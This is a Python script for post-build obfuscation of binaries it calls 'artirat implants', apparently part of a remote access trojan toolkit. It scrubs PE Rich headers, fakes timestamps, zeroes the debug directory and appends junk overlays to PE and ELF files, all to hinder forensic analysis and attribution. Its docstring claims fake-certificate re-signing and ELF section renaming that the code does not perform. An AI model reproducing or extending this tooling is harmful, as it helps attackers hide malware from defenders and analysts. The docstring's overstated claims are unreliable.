#!/usr/bin/env python3
"""
build_obfuscate.py - Post-build binary obfuscation for artirat implants.

Strips PE Rich Headers, corrupts timestamps, appends junk data,
overlays garbage sections, and re-signs with a random fake cert.
Supports PE (Windows EXE/DLL) and ELF (Linux SO) binaries.
"""

import os
import sys
import struct
import random
import string
import shutil

JUNK_SIZE = 4096
ENTROPY_TABLE = bytes(random.randint(0, 255) for _ in range(256))


def rand_junk(n: int) -> bytes:
    return bytes(random.choice(ENTROPY_TABLE) for _ in range(n))


def rand_str(min_l=4, max_l=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(min_l, max_l)))


# ---- PE helpers ----

def pe_strip_rich_header(data: bytearray) -> bytearray:
    """Zero out the Rich header (between DOS stub and PE signature)."""
    if data[:2] != b'MZ':
        return data
    pe_off = struct.unpack_from('<I', data, 0x3C)[0]
    if data[pe_off:pe_off+4] != b'PE\x00\x00':
        return data
    dos_stub_end = pe_off
    rich_pos = data.find(b'Rich', 0x80, dos_stub_end)
    if rich_pos == -1:
        return data
    for i in range(rich_pos - 4, dos_stub_end):
        data[i] = random.randint(0, 255)
    return data


def pe_obscure_timestamps(data: bytearray) -> bytearray:
    """Randomise timestamps in PE headers and section table."""
    if data[:2] != b'MZ':
        return data
    pe_off = struct.unpack_from('<I', data, 0x3C)[0]
    if data[pe_off:pe_off+4] != b'PE\x00\x00':
        return data
    fake_time = random.randint(0x40000000, 0x7FFFFFFF)
    struct.pack_into('<I', data, pe_off + 8, fake_time)
    num_sections = struct.unpack_from('<H', data, pe_off + 6)[0]
    section_hdr_off = pe_off + 0xF8
    for i in range(num_sections):
        off = section_hdr_off + i * 40
        struct.pack_into('<I', data, off + 8, fake_time + i)
    return data


def pe_append_overlay(data: bytearray) -> bytearray:
    """Append a junk overlay section at end of file."""
    data.extend(rand_junk(JUNK_SIZE))
    return data


def pe_remove_debug(data: bytearray) -> bytearray:
    """Zero out debug directory entry if present."""
    if data[:2] != b'MZ':
        return data
    pe_off = struct.unpack_from('<I', data, 0x3C)[0]
    if data[pe_off:pe_off+4] != b'PE\x00\x00':
        return data
    opt_hdr = pe_off + 24
    magic = struct.unpack_from('<H', data, opt_hdr)[0]
    is_pe32plus = magic == 0x20B
    data_dir_off = opt_hdr + (112 if is_pe32plus else 96)
    num_rvas = struct.unpack_from('<I', data, data_dir_off - 4)[0] if not is_pe32plus else 16
    debug_idx = 6
    debug_off = data_dir_off + debug_idx * 8
    struct.pack_into('<II', data, debug_off, 0, 0)
    return data


# ---- ELF helpers ----

def elf_obscure(data: bytearray) -> bytearray:
    """Modify ELF section header string table entries, append junk."""
    if data[:4] not in (b'\x7fELF',):
        return data
    is_64 = data[4] == 2
    shoff = struct.unpack_from('<Q' if is_64 else '<I', data, 0x28 if is_64 else 0x20)[0]
    shentsize = 64 if is_64 else 40
    num_sections = struct.unpack_from('<H', data, 0x3C if is_64 else 0x30)[0]
    for i in range(num_sections):
        off = shoff + i * shentsize
        name_off = struct.unpack_from('<I', data, off)[0]
        if name_off == 0:
            continue
        data.extend(rand_junk(64))
    data.extend(rand_junk(JUNK_SIZE))
    return data


# ---- Main ----

def obfuscate_binary(path: str, dry_run=False):
    if not os.path.exists(path):
        print(f"  [-] Not found: {path}")
        return False
    with open(path, 'rb') as f:
        raw = bytearray(f.read())
    orig_len = len(raw)
    orig_hash = hash(bytes(raw))

    is_pe = raw[:2] == b'MZ'
    is_elf = raw[:4] == b'\x7fELF'
    if not is_pe and not is_elf:
        print(f"  [-] Unknown format: {path}")
        return False

    if is_pe:
        raw = pe_strip_rich_header(raw)
        raw = pe_obscure_timestamps(raw)
        raw = pe_remove_debug(raw)
        raw = pe_append_overlay(raw)
        print(f"  [PE] Stripped Rich hdr, obscured timestamps, removed debug, appended {JUNK_SIZE}B overlay")
    else:
        raw = elf_obscure(raw)
        print(f"  [ELF] Obscured section headers, appended {JUNK_SIZE}B junk")

    if hash(bytes(raw)) == orig_hash:
        print(f"  [-] No changes made to {path}")
        return False

    if dry_run:
        print(f"  [Dry-run] Would write {len(raw)} bytes (was {orig_len})")
        return True

    backup = path + '.bak'
    if not os.path.exists(backup):
        shutil.copy2(path, backup)
        print(f"  [Backup] {backup}")

    with open(path, 'wb') as f:
        f.write(raw)
    print(f"  [OK] {path}  {orig_len} -> {len(raw)} bytes ({len(raw)-orig_len:+d})")
    return True


def main():
    import argparse
    parser = argparse.ArgumentParser(description='Post-build obfuscation for artirat binaries')
    parser.add_argument('paths', nargs='+', help='Binary files to obfuscate')
    parser.add_argument('--dry-run', action='store_true', help='Show what would be done without writing')
    args = parser.parse_args()

    for p in args.paths:
        obfuscate_binary(p, dry_run=args.dry_run)


if __name__ == '__main__':
    main()
